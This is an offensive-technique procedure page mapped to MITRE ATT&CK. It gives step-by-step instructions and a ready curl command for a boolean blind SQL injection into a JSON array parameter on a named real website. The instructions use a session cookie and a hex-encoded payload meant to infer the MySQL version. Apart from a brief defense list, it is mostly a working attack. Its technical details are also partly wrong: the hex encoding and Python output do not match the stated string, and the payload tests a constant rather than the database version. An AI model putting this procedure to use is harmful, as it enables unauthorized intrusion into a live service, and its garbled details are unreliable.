---
id: proc-craft-sqli-payload-zomato
tags:
  - sqli
  - blind-sqli
  - payload-crafting
type: procedure
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-boolean-sqli-test]]'
verified: false
platforms:
  - Web
  - PHP
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:26.296Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft Boolean SQLi Payload in JSON Parameter

## Summary

This procedure crafts and injects a boolean-based SQL payload into the 'brids' JSON array to test database conditions, such as MySQL version inference, using functions like MID and LIKE.

## Description

The vulnerability stems from unsanitized JSON processing in the backend SQL query. By closing the string with ')', adding comments (/**/), and injecting an OR condition with hex-encoded strings, attackers can force true/false evaluations. True conditions cause query errors (500), false ones succeed (200), enabling blind data extraction.

## Requirements

1. Valid {RES_ID} and {SESSION_COOKIE}
2. Knowledge of MySQL functions (MID, LIKE)
3. Hex encoder for payloads (e.g., '5.6.3-log' as 0x352e362e33332d6c6f67)
4. HTTP client like curl

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all JSON inputs before query incorporation
- Employ input whitelisting for array elements
- Monitor for hex-encoded strings and SQL functions in request bodies

## Objectives

1. Inject OR condition to manipulate query logic
2. Test specific database facts (e.g., version starts with '5')
3. Observe error-based differentiation

## Instructions

### Step 1: Encode Payload Components

**Context**: Prepare the hex string for the version to avoid direct injection detection.

**Command** (Manual encoding, no bash):
No direct command; use online hex encoder or Python: `python3 -c "print('5.6.3-log'.encode('utf-8').hex())"` outputs 356536323e333332d6c6f67 (adjust for full).

> Result: 0x352e362e33332d6c6f67 for '5.6.3-log'.

### Step 2: Inject Payload

**Context**: Send the crafted payload to trigger the boolean condition.

**Command** ([[commands/curl-boolean-sqli-test]]):
```bash
curl -X POST "https://www.zomato.com/█████.php?res_id={RES_ID}" \
  -H "Host: www.zomato.com" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0" \
  -H "Accept: */*" \
  -H "Accept-Language: nl,en-US;q=0.7,en;q=0.3" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Cookie: PHPSESSID={SESSION_COOKIE};" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "action=show_support_breakups&brids=[\"')/**/OR/**/MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/5/**/%23\"]"
```

> Expected output: 500 if MID(version,1,1) LIKE '5' (true), terminating with %23 (#).

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-boolean-sqli-test]]

## Tools Used


## Tags

- [[sqli]]
- [[blind-sqli]]
